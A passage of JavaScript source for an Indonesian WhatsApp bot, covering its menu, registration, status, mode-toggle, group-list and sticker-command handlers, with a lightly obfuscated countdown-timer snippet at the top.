	             var _0x5ba5=['floor','\x20Hari\x20','1wVZZlY','102871psRAoH','304ZfsTDS','43kbgWdY','281CXVwGS','1uBGtax','2727FilWTC','106921JbOjDx','3347pHCEdI','\x20Menit\x20','665357OGvkOE','getTime','430881FpXuSX','4zwWHeO','5711kBTVfh','\x20Detik'];function _0x595c(_0x5ef0c3,_0x1063cc){_0x5ef0c3=_0x5ef0c3-0x1ad;var _0x5ba5c2=_0x5ba5[_0x5ef0c3];return _0x5ba5c2;}var _0x17d02d=_0x595c;(function(_0x2267a4,_0x13a425){var _0x19d78a=_0x595c;while(!![]){try{var _0x1494a8=parseInt(_0x19d78a(0x1ba))+-parseInt(_0x19d78a(0x1af))*parseInt(_0x19d78a(0x1bb))+-parseInt(_0x19d78a(0x1b4))*-parseInt(_0x19d78a(0x1b2))+parseInt(_0x19d78a(0x1bc))*parseInt(_0x19d78a(0x1b1))+parseInt(_0x19d78a(0x1b5))*-parseInt(_0x19d78a(0x1b3))+parseInt(_0x19d78a(0x1b8))*parseInt(_0x19d78a(0x1ae))+parseInt(_0x19d78a(0x1b6))*-parseInt(_0x19d78a(0x1b0));if(_0x1494a8===_0x13a425)break;else _0x2267a4['push'](_0x2267a4['shift']());}catch(_0x21b6cb){_0x2267a4['push'](_0x2267a4['shift']());}}}(_0x5ba5,0x8bb2d));var countDownDate=new Date(''+kapan)[_0x17d02d(0x1b9)](),now=new Date()[_0x17d02d(0x1b9)](),distance=countDownDate-now,dayss=Math[_0x17d02d(0x1be)](distance/(0x3e8*0x3c*0x3c*0x18)),hourss=Math['floor'](distance%(0x3e8*0x3c*0x3c*0x18)/(0x3e8*0x3c*0x3c)),minutess=Math[_0x17d02d(0x1be)](distance%(0x3e8*0x3c*0x3c)/(0x3e8*0x3c)),secondss=Math[_0x17d02d(0x1be)](distance%(0x3e8*0x3c)/0x3e8);ultahku=dayss+_0x17d02d(0x1ad)+hourss+'\x20Jam\x20'+minutess+_0x17d02d(0x1b7)+secondss+_0x17d02d(0x1bd);
				stat = public ? 'PUBLIC': 'SELF'
				Charge = charging ? 'Di Cas ⚡' : 'Tidak dicas 🔌'
				Statos = offline ? 'OFFLINE' : 'ONLINE'
				bio = bio.status == 401 ? 'None' : bio.status
				own = isOwner ? 'OWNER' : 'USER'
//********** TAGGAL **********/
myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum at','Sabtu'];
var tgl = new Date();
detik = tgl.getSeconds();
menit = tgl.getMinutes();
jam = tgl.getHours();
var ampm = jam >= 12 ? 'PM' : 'AM';
var day = tgl.getDate()
bulan = tgl.getMonth()
var thisDay = tgl.getDay(),
thisDay = myDays[thisDay];
var yy = tgl.getYear()
var year = (yy < 1000) ? yy + 1900 : yy;
const tanggal = `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
//********** WAKTU **********/
jam = moment.tz('Asia/Jakarta').format('HH:mm')
wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
ultah = new Date('2022','03','12').valueOf()
tungmun = moment(ultah - Date.now()).format('DD [Hari], HH [Jam], mm [Menit], ss [Detik]')

				switch(command) {
/*====================================================[ COMMAND ]==============================================================*/                    	 									
				case 'menu':
				if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Lu sudah terbenned!')
				try {
				ppimg = await zacky.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
				ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				
const txtt = `ㅤ╭━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙
ㅤ│  │ *「 INFO ${own} 」*
┌┤➛ *Nama* : ${pushname}
││➛ *Nomer* : @${sender.split("@")[0]}
││➛ *Premium* : ${premi}
││➛ *Uang mu* : Rp${uangku}
││➛ *XP* : ${getLevelingXp(sender)}/${reqXp}
││➛ *Level* : ${getLevelingLevel(sender)}
││➛ *Rank* : ${role}
││➛ *Tingkat* : ${bars}
│╰────────────┈ ⳹
│
│ *「 INFO BOT 」*
│➛ *Name* : ${NamaBot}
│➛ *Prefix* : ⸨ ${prefix} ⸩
│➛ *Mode* : ${stat}
│➛ *Info* : ${Statos}
│➛ *Menu* : Original
│➛ *Baterai* : ${battre}
│➛ *Charged* : ${Charge}
│➛ *RAM* : ${RAM}
│➛ *Speed :* ${process.uptime()}
│➛ *Run Time :* ${runtime}
│➛ *Hit Today* : ${hitt.length}
│➛ *Group Chat* : ${good.length}
│➛ *Personal Chat*: ${totalchat.length - good.length}
│➛ *Total Chat* : ${totalchat.length}
│➛ *User register* : ${_registered.length} User
├─────────────┈ ⳹
│ *「 WAKTU 」*
│➛ *Hari :* ${weton}
│➛ *Tanggal :* ${tampilTanggal}
│➛ *WIB :* ${wib}
│➛ *WITA :* ${wita}
│➛ *WIT :* ${wit}
├─────────────┈ ⳹
│ *「 STATUS 」*
│➛ *ReadGc* ${readGc ? "✔️" : "❌"}
│➛ *ReadPc* ${readPc ? "✔️" : "❌"}
│➛ *Autorecording* ${autorecording ? "✔️" : "❌"}
│➛ *Autoplaymusic* ${autoplaymusic ? "✔️" : "❌"}
│➛ *Ketikgc* ${ketikgc ? "✔️" : "❌"}
│➛ *Ketikpc* ${ketikpc ? "✔️" : "❌"}
│➛ *Antitrol* ${antitrol ? "✔️" : "❌"}
│➛ *Antibugc* ${bugc ? "✔️" : "❌"}
│➛ *Error Detect* ${ellol ? "✔️" : "❌"}
│➛ *AutoBio* ${autobio ? "✔️" : "❌"}
╰━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙`			   
               buttons = [{buttonId:`${prefix}allmenu`,buttonText:{displayText: '⋮☰ ALL MENU'},type:1},               
               {buttonId:`${prefix}command`,buttonText:{displayText:'⎙ LIST MENU'},type:1},
               {buttonId:`${prefix}owner`,buttonText:{displayText:'👤 OWNER'},type:"RESPONSE"}]
                              
               let content = await getBuffer(ppimg)
               sendButLocation(from, txtt, `${wib} WIB\n${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`, content, buttons)
               break
				case 'help':		
				case 'command':
				case 'listmenu':
				if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Lu sudah terbenned!')
                listMsg = {
						"title":  `Selamat ${tampilHari} @${sender.split("@")[0]}`,
						"description": "List menu Bot ada disini silahkan di pilih",
						"buttonText": "LIST MENU",
						"footerText": `${wib} WIB\n${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`,
						"listType": "SINGLE_SELECT",
						"sections": [
						{                      						        
								"title": "◉ ALL MENU",
								"rows": [
									{
										"title": `ALL MENU`,
										"description": "\n_choose this if you want to use the allmenu command_",
										"rowId": `${prefix}allmenu`
									}]},
							{
								"title": "◉ Menu ke-1",
								"rows": [
									{
										"title": `STICKER MENU`,
										"description": "\n_choose this if you want to use the stickermenu command_",
										"rowId": `${prefix}stickermenu`
									}]},
							{
								"title": "◉ Menu ke-2",
								"rows": [
									{
										"title": `PREMIUM MENU`,
										"description": "\n_choose this if you want to use the premium command_",
										"rowId": `${prefix}premium`
									}]},
							{
								"title": "◉ Menu ke-3",
								"rows": [
									{
										"title": `OWNER MENU`,
										"description": "\n_choose this if you want to use the ownermenu command_",
										"rowId": `${prefix}ownermenu`
									}]},
							{
								"title": "◉ Menu ke-4",
								"rows": [
									{
										"title": `GROUP MENU`,
										"description": "\n_choose this if you want to use the Grupmenu command_",
										"rowId": `${prefix}grupmenu`
									}]},
							{
								"title": "◉ Menu ke-5",
								"rows": [
									{
										"title": `BUG MENU`,
										"description": "\n_choose this if you want to use the Bugmenu command_",
										"rowId": `${prefix}bugmenu`
									}]},
							{
								"title": "◉ Menu ke-6",
								"rows": [
									{
										"title": `TOD MENU`,
										"description": "\n_choose this if you want to use the tod command_",
										"rowId": `${prefix}todmenu`
									}]},
							{
								"title": "◉ Menu ke-7",
								"rows": [
									{
										"title": `ANIME MENU`,
										"description": "\n_choose this if you want to use the anime command_",
										"rowId": `${prefix}anime`
									}]},
							{
								"title": "◉ Menu ke-8",
								"rows": [
									{
										"title": `ISLAMI MENU`,
										"description": "\n_choose this if you want to use the islami command_",
										"rowId": `${prefix}islami`
									}]},
							{
								"title": "◉ Menu ke-9",
								"rows": [
									{
										"title": `DOWNLOAD MENU`,
										"description": "\n_choose this if you want to use the download command_",
										"rowId": `${prefix}download`
									}]},
							{
								"title": "◉ Menu ke-10",
								"rows": [
									{
										"title": `CMD MENU`,
										"description": "\n_choose this if you want to use the set stc cmdmenu command_",
										"rowId": `${prefix}cmdmenu`
									}]},
							{
								"title": "◉ Menu ke-11",
								"rows": [
									{
										"title": `MOVIE MENU`,
										"description": "\n_choose this if you want to use the movie command_",
										"rowId": `${prefix}movie`
									}]},
							{
								"title": "◉ Menu ke-12",
								"rows": [
									{
										"title": `ANTI VIRUS`,
										"description": "\n_choose this if you want to use the antivirus command_",
										"rowId": `${prefix}antivirus`
									}]},
							{
								"title": "◉ Menu ke-13",
								"rows": [
									{
										"title": `SEARCHING`,
										"description": "\n_choose this if you want to use the searching command_",
										"rowId": `${prefix}searching`
									}]},
							{
								"title": "◉ Menu ke-14",
								"rows": [
									{
										"title": `RANDOM TEXT`,
										"description": "\n_choose this if you want to use the asupan randomtext command_",
										"rowId": `${prefix}randomtext`
									}]},
							{
								"title": "◉ Menu ke-15",
								"rows": [
									{
										"title": `ANIMANGA MENU`,
										"description": "\n_choose this if you want to use the image effect animanga command_",
										"rowId": `${prefix}animanga`
									}]},
							{
								"title": "◉ Information bot",
								"rows": [
									{
										"title": `INFORMASI`,
										"description": "\n_choose this if you want to know information this bot_",
										"rowId": `${prefix}information`
									}]},
							{
								"title": "◉ Contribution",
								"rows": [
									{
										"title": `OWNER BOT`,
										"description": "\n_choose this if you want to know anyone who contributed to this script_",
										"rowId": `${prefix}owner`
									}]}						
						],
 listType: 1
}
zacky.sendMessage(from, listMsg, MessageType.listMessage, {quoted: fitem, contextInfo: {"mentionedJid": [sender], forwardingScore: 1000, isForwarded: true}})
break
                case 'allfitur':
				case 'allmenu':				
			    if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Lu sudah terbenned!')
				try {
								ppimg = await zacky.getProfilePicture(`${sender.split('@')[0]}@c.us`)
								} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}				
				buttons = [{buttonId:`${prefix}help`,buttonText:{displayText: '⎙ LIST MENU'},type:1}]                              
               
               let crott = await getBuffer(ppimg)
               const medios = await zacky.prepareMessage(from, crott, MessageType.image, { thumbnail:ppimg})
               let bacotluwh = medios.message["ephemeralMessage"] ? medios.message.ephemeralMessage : medios
               
               buttonsMessage = {
               contentText: help(prefix),
               footerText: `${wib} WIB\n${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`,
               imageMessage: bacotluwh.message.imageMessage,
               buttons: buttons,
               headerType: 4
               }
               prep = await zacky.prepareMessageFromContent(from,{buttonsMessage},{quoted: btrai, contextInfo: {"mentionedJid": [send, sen, senk, sender], forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `Selamat ${tampilHari}, Im ${NamaBot}`, thumbnail: imageh, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/dQw4w9WgXcQ"}}})
               zacky.relayWAMessage(prep)
			   break
                    case 'premium':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: plem(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'stickermenu':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: stickerr(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'game':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: game(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'setting':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: seting(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'ownermenu':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: owner(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'todmenu':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: tod(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'anime':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: anime(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'islami':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: islam(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'download':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: downlod(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'movie':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: movie(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'searching':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: searching(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'randomtext':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: randomtxt(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'animanga':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: animanga(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'information':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: ingfo(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'entertainment':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: entert(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'soundchanger':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: chnger(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'creator':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: creat(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'primbon':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: primbon(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'stalk':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: stalk(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'textpro':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: texpro(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'photoxy':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: potoxy(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'ephoto':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: epoto(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'film':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: film(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'search':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: searc(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'berita':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: berita(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'deteksi':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: detek(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'nsfw':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: nsftw(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'randomimg':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: randomimg(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'soviet':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: soviet(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'storage':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: storage(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'entah':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: entah(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'basenc':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: basenc(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'asupan':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: asup(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'shortlink':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: shortl(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'grupmenu':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: grupp(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'antivirus':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: anti(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'edit':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: edit(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'sertifikat':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: serti(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'nulismenu':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: nulis(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'sound':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: sound(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'cmdmenu':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: cmdd(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    case 'bugmenu':
                    zacky.sendMessage(from, imageh, image, {thumbnail:fs.readFileSync('./lib/◇.jpeg'), quoted: btrai, caption: bugg(prefix), contextInfo: {forwardingScore: 1000, isForwarded: true}})
                   break
                    break
                    case 'public':
                    case 'publik':
                    if (!mek.key.fromMe && !isOwner) return reply('Bot Only')
                    public = true
                    zacky.sendMessage(from, 'SUKSES MENGUBAH MODE : *PUBLIC*', text, {quoted: freply, contextInfo: {forwardingScore: 1000, isForwarded: true}})
                    break
                    case 'self':
                    if (!mek.key.fromMe && !isOwner) return reply('Bot Only')
                    public = false
                    zacky.sendMessage(from, 'SUKSES MENGUBAH MODE : *SELF*', text, {quoted: freply, contextInfo: {forwardingScore: 1000, isForwarded: true}}) 
                    break		
				    case 'info':				
				    case 'status':
				    if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	 			    if (isBanned) return reply('Maaf kamu sudah terbenned!')
					me = zacky.user
					anu = process.uptime()
teskny = `*╭────「 STATUS 」───┈ ❋ཻུ۪۪⸙*
*├❒ Nama bot* : ${NamaBot}
*├❒ Nomor Bot* : @${me.jid.split('@')[0]}
*├❒ V. Whatsapp :* ${wa_version}
*├❒ Status* : MODE ${stat}
*├❒ RAM :* ${RAM}
*├❒ Baterai* : ${battre}
*├❒ Charged* : ${Charge}
*├❒ MCC :* ${mcc}
*├❒ MNC :* ${mnc}
*├❒ Versi OS :* ${os_version}
*├❒ Merk HP :* ${device_manufacturer}
*├❒ Versi HP :* ${device_model}
*├❒ Group Chat :* ${good.length}
*├❒ Personal Chat :* ${totalchat.length - good.length}
*├❒ Total Chat :* ${totalchat.length}
*├❒ Total Block Contact* : ${blocked.length}
*├❒ Total Pengguna :* ${_registered.length} Orang
*├❒ Speed :* ${process.uptime()}
*├❒ Aktif Selama :* ${kyun(anu)}
*╰───「 ${NamaBot} 」──┈ ❋ཻུ۪۪⸙*`
    buttons = [{buttonId:`${prefix}menu`,buttonText:{displayText: '⋮☰ MENU'},type:1},
               {buttonId:`${prefix}donate`,buttonText:{displayText: '💰 DONASI'},type:1}]  
               imageMsg = (await zacky.prepareMessageMedia(fs.readFileSync('./lib/◇.jpeg'), 'imageMessage', {thumbnail: fs.readFileSync('./lib/◇.jpeg')})).imageMessage
               buttonsMessage = {
               contentText: `${teskny}`,
               footerText: `${wib} WIB\n${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}
               prep = await zacky.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo: {forwardingScore: 1000, isForwarded: true}})
               zacky.relayWAMessage(prep)
               break
				case 'unverifyall':
				if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
				_registered.splice(sender)
				fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
				const mnk = `Sukses Unverify Semua Akun`
				zacky.sendMessage(from, mnk, text, {quoted: freply})
				break
	        case 'verify':
	        case 'daftar':
	        if (isRegistered) return reply('Lu Udah Terdaftar Tod')
	        if (isBanned) return reply('Maaf kamu sudah terbenned!')
	        const serialUser = createSerial(15)
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
const dpter = `╭━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙
│ *「 VERIFICATION SUKSES 」*
│ *Terimakasih Sudah*
│ *Mendaftarkan Diri*
│ *Dalam Database*
╰┬────────────┈ ⳹
┌┤◦➛ *Nama :* ${pushname}
││◦➛ *Nomor :* @${sender.split('@')[0]}
││◦➛ *SN :* ${serialUser}
││◦➛ *Total Pengguna :* ${_registered.length} Orang
││◦➛ *Status :* ☑️ Terverifikasi
│╰────────────┈ ⳹
│ *Waktu Pendaftaran*
│ *Tanggal :* ${day} - ${myMonths[bulan]} - ${year}
│ *WIB :* ${wib}
│ *WITA :* ${wita}
│ *WIT :* ${wit}
│ *Hari :* ${weton}
├────────────────
│ *Silahkan Ketik ${prefix}menu*
│ *Untuk Melanjutkan Pengguna*
╰━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙
*「 ${NamaBot} 」*`
   buttons = [{buttonId:`${prefix}menu`,buttonText:{displayText: '⋮☰ MENU'},type:1},
               {buttonId:`${prefix}info`,buttonText:{displayText: '⫹⫺ INFO BOT'},type:1}]                                      
               sendButMessage(from, dpter, `${wib} WIB\n${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`, buttons, {quoted: fkontak, contextInfo: {"mentionedJid": [sender], forwardingScore: 1000, isForwarded: true}})
               console.log(color('ㄙ[ REGISTER ]', 'aqua'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))                     
               break
				    case 'blocklist':
				if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	 		    if (isBanned) return reply('Maaf kamu sudah terbenned!')
				teks = '┌─❑ *「 TOTAL BLOCKLIST 」*\n'
				for (let block of blocked) {
				teks += `│◪ @${block.split('@')[0]}\n`
				}
				teks += `└───⸨ *TOTAL: ${blocked.length}* ⸩───❑`
				zacky.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})
				break
 			    case 'jadibot':
			    if(mek.key.fromMe) return reply('TES')
			    jadibot(reply,Manik,from)
			var jadibdj = await getBuffer('https://telegra.ph/file/18be96b6415ea8833dbe5.jpg')
							sendButLocation(from, jadibut() , `Jangan klik doang 〽️© | By ${creator}`,jadibdj,  [{"buttonId": `payment`,"buttonText": {"displayText": "PAYMENT"},"type": "RESPONSE"}], {})
							break
		case 'listbot':
		        if (isBanned) return reply('Lu sudah terbenned!')
			    let tekss = '「 *LIST JADIBOT* 」\n'
			    for(let i of listjadibot) {
			    tekss += `*Number* : ${i.jid.split('@')[0]}
*Name* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
			    }
			    reply(tekss)
			    break
		case 'grouplist':
                case 'gruplist':
                case 'listgroup':
                case 'listgrup':
                if (isBanned) return reply('Maaf kamu sudah terbenned!')
				const txs = zacky.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
                reply(txs)
	                 break
case 'addcmd': 
case 'setcmd':
if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply('Maaf kamu sudah terbenned!')
if (isQuotedSticker) {
if (!q) return reply(`Contoh : ${prefix + command} ${prefix}menu dan tag stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
reply("Done Bwang")
} else {
reply('tag stickenya')
}
break
case 'delcmd':
if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isQuotedSticker) return reply(`Contoh : ${prefix + command} tagsticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
reply("Done Bwang")
break
case 'listcmd':
if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply('Maaf kamu sudah terbenned!')
let teksnyee = `${uwu}「 LIST CMD STIC 」${uwu}`
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*❏ ID :* ${i.id}\n*❏ Cmd :* ${i.chats}`
}
reply(teksnyee + `\n\n${uwu}「 TOTAL STIC: ${cemde.length} 」${uwu}`)
break
			case 'addrespon':
			case 'filter':
			if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				    fltr = q.split('|')[0]
					jwb = q.split('|')[1]
					if(!jwb) return reply('Format salah!')
					for(let i of filter){
					  if(fltr.includes(i.Filter)) return reply(`Filter ${fltr} sudah ada didatabase`)
					}
					const chat = {
					Filter : fltr,
					Jawaban : jwb
					}
					filter.push(chat)
					fs.writeFileSync('./src/filter.json', JSON.stringify(filter))
					reply(`Sukses menambahkan filter ${fltr}\nCek dengan cara ${prefix}listfilter`)
					break
			case 'delrespon':
			case 'deletefilter':
			if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				for(let i=0; i<filter.length; i++){
					if(q.includes(filter[i].Filter)){
					   obj = {
					      txt: filter[i].text,
					      balesan: filter[i].balesan
					   }
					   let del = filter.indexOf(filter[i])
